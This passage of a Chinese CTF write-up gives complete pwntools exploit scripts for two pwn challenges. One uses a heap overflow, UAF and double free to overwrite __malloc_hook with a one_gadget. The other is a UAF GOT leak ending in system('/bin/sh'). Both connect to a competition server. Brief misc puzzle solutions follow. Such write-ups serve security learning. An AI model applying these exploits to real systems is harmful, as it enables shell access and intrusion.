                        if ( *(v5 - 16) )
                        {
                          puts(
                            "---------------skYunDun v0.0.0---------------n"
                            "[!] Detected an heap leak!n"
                            "[!] Rolling back....");
                          v5 = 0LL;
                          format = 0LL;
                        }
                        else
                        {
                          free(v5);
                        }
                      }
                      else if ( v10 == '2' )
                      {
                        free(format);
                      }
                    }
                  }
程序基本流程已经知道，漏洞点已经找出，存在堆溢出、UAF漏洞
攻击流程：
  * 先利用溢出触发堆块可以进入`unsortbin`中，从而可以在堆块中出现libc地址
  * 利用`UAF`来泄露出`libc`地址
  * 利用`double free`来修改`__malloc_hook为one_gg`
  * 成功`getshell`  
exp:
    from pwn import *
    # from LibcSearcher import *
    context.log_level='debug'
    debug = 0
    file_name = './pwn'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    ip = '59.110.243.101'
    prot = '25413'
    if debug:
        r = process(file_name)
        libc = ELF(libc_name)
    else:
        r = remote(ip,int(prot))
        libc = ELF(libc_name)
    def debug():
        gdb.attach(r)
        raw_input()
    file = ELF(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("test")
    ru("> > ")
    sl("vim 1")
    ru("> ")
    sl("test")
    ru("> > ")
    sl("rm 2")
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("a"*0x30+p64(0)+p64(0x91))
    ru("> > ")
    sl("vim 2")
    ru("> ")
    sl(p64(0)*3+p64(0x21))
    ru("> > ")
    sl("rm 1")
    ru("> ")
    sl("cat 1")
    libc_base = u64(rud("x0a")+"x00x00")-3951480
    li("libc_base",libc_base)#0x7fbabada7000
    system = libc_base+libc.symbols['system']
    malloc_hook = libc_base + libc.symbols['__malloc_hook']-0x13
    one_gg = 0xf02a4 + libc_base
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("test")
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("test")
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("test")
    ru("> > ")
    sl("vim 1")
    ru("> ")
    sl("test")
    ru("> > ")
    sl("rm 2")
    ru("> ")
    sl("rm 1")
    ru("> ")
    sl("vim 2")
    ru("> ")
    sl("a"*0x30+p64(0)+p64(0x71)+p64(malloc_hook)[:6])
    ru("> > ")
    sl("vim 1")
    ru("> ")
    sl("a"*0x30)
    ru("> > ")
    sl("vim 1")
    ru("> ")
    sl("aaa"+p64(one_gg))
    ru("> ")
    sl("vim 2")
    ri()
    '''
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
###  魔法学院
题目基本信息：保护只开启了NX和canary，`ubuntu16.04`上的64位`PWN`
     radish ➜ pwn3  file pwn
    pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f5509bf1f16f14926887f9f792ac47b65fb87dff, stripped
     radish ➜ pwn3  checksec --file pwn
    [*] '/media/psf/Home/Desktop/xe7xbdx91xe9xbcx8e/pwn3/pwn'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
     radish ➜ pwn3
在IDA里面分析程序，发现和之前做过的一个题非常的相似`攻防世界-hacknote`，只不过是32位变成64位程序，利用方法都是一样的
审计程序发现存在UAF漏洞
程序中的主要结构体：
    struct magic{
        char *put_text_fun_addr;
        char *text_addr;
    }
攻击流程:
  * 首先申请两个text大小为0x20字节的magic
  * 依此释放掉note0、note1
  * 再申请一个text大小为8字节的note，此时note0的结构体就被覆盖
  * leak 真实地址
  * getshell
exp:
    from pwn import *
    import sys
    context.log_level='debug'
    debug = 0
    file_name = './pwn'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    ip = '59.110.243.101'
    prot = '54621'
    if debug:
        r = process(file_name)
        libc = ELF(libc_name)
    else:
        r = remote(ip,int(prot))
        libc = ELF(libc_name)
    file = ELF(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    def add(chunk_size,value):
        ru('Your choice :')
        sl('1')
        ru('magic cost ?:')
        sl(str(chunk_size))
        ru('name :')
        sl(value)
    def delete(index):
        ru('Your choice :')
        sl('2')
        ru('index :')
        sl(str(index))
    def show(index):
        ru('Your choice :')
        sl('3')
        ru('index :')
        sl(str(index))
    def debug():
        gdb.attach(r)
        raw_input()
    add(0x20,"/bin/shx00")#0
    add(0x20,"/bin/shx00")#1
    delete(0)#0
    delete(1)#1
    puts_got = file.got['puts']
    li("puts_got ", puts_got)
    # puts_got = file.got['puts']
    # li("puts_got ", puts_got)
    puts = 0x400886
    pay = p64(puts_got)+p64(puts)
    add(0x10,pay)#2
    # gdb.attach(r)
    show(0)
    puts_addr = u64(rud("n")+"x00x00")
    li("puts_addr ", puts_addr)
    base_addr = puts_addr - libc.symbols['puts']
    system_addr = base_addr+libc.symbols['system']
    li("base_addr",base_addr)
    delete(2)
    pay = "/bin/shx00"+p64(system_addr)
    add(0x10,pay)#2
    show(0)
    ri()
## misc
###  九宫格
题目提供了576个二维码，经过测试发现扫出来的是`zero`和`one`，也就是0和1，利用工具批量扫一下，得到二进制字符串

然后进行转16进制发现是一串已经加密后的字符串
    aaa
    flag = ""
    for x in range(0,len(aaa),8):
        flag += chr(eval("0b"+aaa[x:x+8]))
    # print base64.b64decode(flag)
    print flag
    #U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa
然后观察题目描述：在九宫格内把1-9数字填入，使其横加竖加斜加都为15，将对角线的数字排列组合从打到小的顺序为本题的重要信息
百度一番得到: 对角线排序之后是245568,猜测这个是秘钥
    8 1 6
    3 5 7
    4 9 2
一个一个的试就完事了，AES、DES等等，最后发现是Rabbit加密
[解密网站](https://www.sojson.com/encrypt_rabbit.html)
###  key
题目提供了两个图片，但是第一张在mac上无法显示，在win上可以，所以认为是修改了高度，在010editor修改高度
发现多出来一串字符,提取出来
    295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656
解密一番无果
然后看第二张图片，在010editor可以看出来里面含有flag.txt文件，所以猜测是压缩包
通过改后缀名字为rar即可，但是有密码
密码肯定和第一张图片中的字符串有关
最后在`https://www.cnblogs.com/kagari/p/10833116.html`这里看到了差分曼彻斯特编码，然后尝试解了一下，谁曾想，真的是这个加密！！！
    aaa = "295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656"
    enc = ""
    for x in range(0,len(aaa),2):
        enc+=str(bin(eval("0x"+aaa[x:x+2])))[2:].rjust(8,"0")
    print enc
    s = "1110100101011001011001010101011010011010010110010110011010010110100110010101101010011010101010010110100110011001011010100110101010011010011001101001100101100101011001010110100101101001100110010110100101011001011001101001010101100110101001010110010101010110100110010110011010011010101001010110010101101001011001101010010101100110101001010110011001010110"
    r=""
    tmp = 0
    for i in xrange(len(s)/2):
        c = s[i*2]
        if c == s[i*2 - 1]:
            r += '1'
        else:
            r += '0'
    print hex(int(r,2))[2:-1].decode('hex')
>
> 需要注意的是，十六进制转成二进制后需要，每一个都要填充成8位长度，第一个字符的前两位需要从`00`改成`11`（10，01，11，00）都试一遍，不进行这个操作的话，解出来的第一个字符不在ASCii范围内
    radish ➜ key_123  python test.py
    0010100101011001011001010101011010011010010110010110011010010110100110010101101010011010101010010110100110011001011010100110101010011010011001101001100101100101011001010110100101101001100110010110100101011001011001101001010101100110101001010110010101010110100110010110011010011010101001010110010101101001011001101010010101100110101001010110011001010110
    Sakura_Love_Strawberry
    radish ➜ key_123